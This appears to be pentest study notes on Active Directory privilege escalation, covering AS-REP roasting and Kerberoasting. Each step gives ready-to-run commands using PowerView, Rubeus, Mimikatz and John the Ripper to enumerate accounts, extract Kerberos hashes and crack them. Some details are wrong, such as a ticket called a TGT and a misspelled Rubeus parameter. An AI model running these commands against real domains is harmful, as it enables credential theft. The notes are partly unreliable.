---
title: AD Privilege Escalation
draft: false
tags:
  - windows
  - active-directory
  - post-exploitation
  - privesc
---
 
# AS_REP Roasting
Exploits Kerberos authentication protocol. In kerberos, the user first sends an AS-REQ to the KDC (DC) and if the credentials are correct then the DC sends an AS_REP with the TGT that is encrypted with the users password hash.

AS_REP Roasting exploit the fact that some users in the AD have the "do not require kerberos preauthentication" enabled. This allows to request the AS_REP without sending the AS_REQ with the users password (do not require kerberos pre-authentication).

Steps:
1. Identify vulnerable accounts with the "do not require kerberos preauthentication" enabled:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1
PS> Get-DomainUser | where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" } (display AS_REP roastable users)
Alternative:
PS> Get-NetUser -PreauthNotRequired | select samaccountname, useraccountcontrol (list as-rep roastable accounts: Identify user accounts that have Pre-Authentication disabled)
```

2. Exploit AS_REP roasting to extract password hashes:
```powershell
PS> .\Rubeus.exe asreproast /usr:USERNAME /outfile:HASH_FILE.txt
Parameters:
/usr: roastable user
/outfile: file to store the hash
```

3. Crack the hashes offline:
```powershell
PS> .\john.exe HASH_FILE.txt --format=krb5asrep --wordlist WORDLIST
Parameters:
--format= krb5asrep -> kerberos hash format
```

> [!Note]
> We can authenticate as this user using the plaintext password or the hash through PtH

---
# Kerberoasting
Obtain the password hash of an AD account associated with a Service Principal Name (SPN).

**SPN**: attribute that ties a service to a user account in the AD.

An authenticated domain user request a Kerberos ticket for an SPN. The retrieved TGT is encrypted with the domain user password hash associated with the SPN. Finally, the password hash can be cracked and provide access to any resource in the domain impersonating the owner.

Steps:
1. Identify a user account with SPN enabled:
```powershell
PS> powershell -ep bypass
PS> . .\PowerView.ps1
PS> Get-NetUser | where-Object { $_.servicePrincipalName } | fl (find all SPNs that are registerd to an account accross all domains within the forest)
PS> setspn -T research -Q */* (find all SPNs registered to an account)

Alternative:
PS> Get-NetUser -SPN | select samaccountname, serviceprincipalname
```

2. Request a TGS ticket for the specified SPN using Kerberos:
```powershell
PS> klist (review kerberos tickets for current user)
PS> Add-Type -AssemblyName System.IdentityModel (loads the System.IdentityModel into the PS session which contains the KerberosRequestorSecurityToken class which can request TGS for the specified SPN)
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "SPN" (request an TGS ticket for the specified SPN)
SPN: ops/research.SECURITY.local:1434
PS> klist (we should have one more ticket)
```

3. Crack the password hash from the TGS ticket:
```powershell
PS> . .\Invoke-Mimikatz.ps1
PS> Invoke-Mimikatz -Command '"kerberos::list /export"' (list all kerberos tickets and export them)
PS> ls | select name (display the name of the tickets exported)

PS> python.exe .\kerberoast-Pyhton3\tgsrepcrack.py WORDLIST PATH_TO_TGS_TICKET (crack the password encrypted in the TGS file)
```